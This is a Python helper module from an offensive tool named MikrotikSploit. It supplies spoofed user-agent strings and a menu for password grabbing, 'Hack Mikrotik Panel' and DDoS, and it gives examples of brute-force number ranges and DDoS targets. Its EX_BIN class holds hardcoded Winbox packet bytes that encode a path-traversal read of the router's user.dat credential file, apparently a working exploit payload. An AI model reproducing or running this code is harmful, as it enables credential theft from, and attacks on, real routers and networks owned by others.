#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** MikrotikSploit ***
# * Version:
#   v0.1
# * Date:
#   28 - 08 - 2019 { Wed 28 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************

from color import *


def agent(NUM):
    agents = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) " +
        "Gecko/20100101 Firefox/51.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0)" +
        " Gecko/20100101 Firefox/51.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/56.0.2924.87 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; " +
        "Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS " +
        "X 10_12_2) AppleWebKit/602.3.12 (KHTML, " +
        "like Gecko) Version/10.0.2 Safari/602.3.12",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; " +
        "rv:51.0) Gecko/20100101 Firefox/51.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 " +
        "like Mac OS X) AppleWebKit/602.4.6 (KHTML, " +
        "like Gecko) Version/10.0 Mobile/14D27" +
        " Safari/602.1",
        "Mozilla/5.0 (Linux; Android 6.0.1; " +
        "Nexus 6P Build/MTC19X) AppleWebKit/537.36 " +
        "(KHTML, like Gecko) Chrome/56.0.2924.87 " +
        "Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 " +
        "Build/KTU84P) AppleWebKit/537.36 (KHTML, " +
        "like Gecko) Chrome/56.0.2924.87" +
        "Mobile Safari/537.36",
        "Mozilla/5.0 (compatible; Googlebot/2.1; " +
        "(http://www.google.com/bot.html)"
    ]
    return agents[int(NUM)]


def asc():
    ASCK = input(f"""
{W}[{N} 1 {W}]{B} Getting Password   
{W}[{N} 2 {W}]{B} Hack Mikrotik Panel 
{W}[{N} 3 {W}]{B} DDoS Network 
{W}[{N} 4 {W}]{B} About Us  
{W}[{N} 5 {W}]{B} Update
{W}[{N} 6 {W}]{B} Exit  
\n\n
{W}---------------------{N}
{B}{F2}Enter A Number{N}:""")

    return ASCK


def EX818M():
    S_ = """ 
Examples:
    |
    |
    |---> Enter the URL Page Login : http://a.net or 10.0.0.1
    |---> Enter the Min Number     : 72940000
    |---> Enter the MXn Number     : 72949999
    
    """
    S2_ = """
Examples:
    |
    |
    |---> Enter the URL For DDoS: http://a.net
    """
    return [S_, S2_]


class EX_BIN:
    def __init__(self):
        pass

    def BIN(self):
        bin1 = bytearray([0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
                          0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
                          0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
                          0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
                          0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
                          0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
                          0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
                          0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
                          0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
                          0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
                          0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
                          0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
                          0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
                          0x00, 0x00])

        bin2 = bytearray([0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
                          0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
                          0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
                          0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
                          0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
                          0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
                          0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
                          0x00, 0x02, 0x00, 0x00, 0x00])

        return [bin1, bin2]
